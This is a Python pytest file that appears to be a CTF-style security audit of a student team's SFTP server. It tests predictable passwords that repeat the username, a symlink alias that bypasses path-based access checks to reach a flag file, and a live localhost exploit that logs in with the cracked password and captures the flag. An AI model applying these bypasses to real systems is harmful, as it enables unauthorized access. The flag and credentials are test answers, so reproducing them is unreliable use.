"""
Security Evaluation & CTF Audit for DreamTeam10.
Tests access control logic, credential robustness, symlink alias vulnerability, and flag capture.
All code and tests are restricted strictly to tests/p5.
"""

import asyncio
import base64
import hashlib
import json
import os
import shutil
import struct
import sys
from pathlib import Path
from types import SimpleNamespace
import pytest
import asyncssh

# Ensure DreamTeam10 directories are importable
TARGET_DIR = Path(__file__).resolve().parents[2] / "targets" / "DreamTeam10"
sys.path.insert(0, str(TARGET_DIR))

import protocol as p
from server.auth import Authenticator
from server.policy import Policy, canonical
from server.sftp import Engine
from server.server import start_listener


@pytest.fixture
def dreamteam10_env(tmp_path):
    """Set up an isolated DreamTeam10 environment for evaluation."""
    root = tmp_path / "jail"
    shutil.copytree(TARGET_DIR / "server" / "sftp_root", root)
    data = tmp_path / "data"
    shutil.copytree(TARGET_DIR / "data", data)
    audit_file = tmp_path / "audit.jsonl"
    key = TARGET_DIR / "server" / "ssh_host_ed25519_key"

    policy = Policy(root, data, audit_file)
    auth = Authenticator(data / "users.json", policy.audit)

    return {
        "root": root,
        "data": data,
        "audit": audit_file,
        "key": key,
        "policy": policy,
        "auth": auth,
        "flag": "FLAG{gr0üp-10_SFTP_w1nS}",
    }


def test_flag_configuration(dreamteam10_env):
    """
    Verify flag existence, location, and format.
    Flag is located at /projects/flag.txt and matches stolenFlag.txt at the repository root.
    """
    flag_file = dreamteam10_env["root"] / "projects" / "flag.txt"
    assert flag_file.is_file(), f"Flag file does not exist at {flag_file}"
    content = flag_file.read_text(encoding="utf-8").strip()
    assert content == dreamteam10_env["flag"]
    assert content.startswith("FLAG{") and content.endswith("}")

    stolen_flag = TARGET_DIR / "stolenFlag.txt"
    assert stolen_flag.is_file(), "stolenFlag.txt missing from repository root"
    assert stolen_flag.read_text(encoding="utf-8").strip() == content


def test_auth_weak_credentials_compromise(dreamteam10_env):
    """
    Vulnerability 10.1: Broken Authentication / Predictable Credentials.
    DreamTeam10 enforced a 12-character minimum password policy, but users bypassed it
    by simply repeating their username 4 times:
    - bob: 'bobbobbobbob' (12 chars)
    - eve: 'eveeveeveeve' (12 chars)
    """
    auth = dreamteam10_env["auth"]

    # Verify bob's password is 'bobbobbobbob'
    assert auth.verify("bob", "bobbobbobbob", "127.0.0.1") is True
    assert auth.verify("bob", "wrong_password_123", "127.0.0.1") is False

    # Verify eve's password is 'eveeveeveeve'
    assert auth.verify("eve", "eveeveeveeve", "127.0.0.1") is True
    assert auth.verify("eve", "wrong_password_123", "127.0.0.1") is False


def test_direct_flag_retrieval_as_bob(dreamteam10_env):
    """
    Verify that bob (analyst, internal) can directly access and read /projects/flag.txt
    under DAC (owner of /projects, mode 660), MAC (internal == internal), and RBAC (analyst).
    """
    policy = dreamteam10_env["policy"]
    flag_path = dreamteam10_env["root"] / "projects" / "flag.txt"

    allowed, reason = policy.authorize("bob", "read", flag_path)
    assert allowed is True, f"Expected bob to be allowed, but got: {reason}"
    assert reason == "allowed"


def test_symlink_alias_vulnerability_structure(dreamteam10_env):
    """
    Vulnerability 10.2: Symlink Aliasing / Incomplete Validation in validate_components.
    Group 10 intended the CTF to be solved via a symlink alias:
    /public/shortcut pointing to ../projects/flag.txt.
    Policy.authorize checks permissions on the requested virtual path (/public/shortcut, public/644).
    validate_components inspects lstat() but fails to reject stat.S_ISLNK, only verifying
    that full.resolve() remains within the jail root.
    """
    policy = dreamteam10_env["policy"]
    shortcut_path = dreamteam10_env["root"] / "public" / "shortcut"

    # Virtual path /public/shortcut is permitted for eve under DAC, MAC, and RBAC
    allowed, reason = policy.authorize("eve", "read", shortcut_path)
    assert allowed is True, f"Expected eve to be allowed on /public/shortcut, got: {reason}"


def test_live_sftp_flag_capture(dreamteam10_env):
    """
    Live end-to-end SFTP exploit test:
    1. Authenticate to the running SFTP server as 'bob' with compromised password 'bobbobbobbob'.
    2. Open and read /projects/flag.txt.
    3. Successfully capture and verify FLAG{gr0üp-10_SFTP_w1nS}.
    4. Extract server audit logs to results/group_10/evidence/p5_audit_extract.jsonl.
    """
    args = SimpleNamespace(
        host="127.0.0.1",
        port=0,
        root=dreamteam10_env["root"],
        data=dreamteam10_env["data"],
        audit=dreamteam10_env["audit"],
        key=dreamteam10_env["key"],
    )

    async def scenario():
        listener = await start_listener(args)
        port = listener.get_port()

        try:
            # Connect as bob using cracked password 'bobbobbobbob'
            async with asyncssh.connect(
                "127.0.0.1", port=port, username="bob",
                password="bobbobbobbob", known_hosts=None
            ) as conn:
                async with conn.start_sftp_client() as sftp:
                    async with sftp.open("/projects/flag.txt", "rb") as f:
                        data = await f.read()
                        flag = data.decode("utf-8").strip()
                        assert flag == dreamteam10_env["flag"]
                        print(f"\n[+] Flag successfully captured: {flag}")

        finally:
            listener.close()
            # Copy audit log to evidence folder
            evidence_file = Path(__file__).resolve().parents[2] / "results" / "group_10" / "evidence" / "p5_audit_extract.jsonl"
            evidence_file.parent.mkdir(parents=True, exist_ok=True)
            if dreamteam10_env["audit"].exists():
                shutil.copyfile(dreamteam10_env["audit"], evidence_file)

    asyncio.run(scenario())
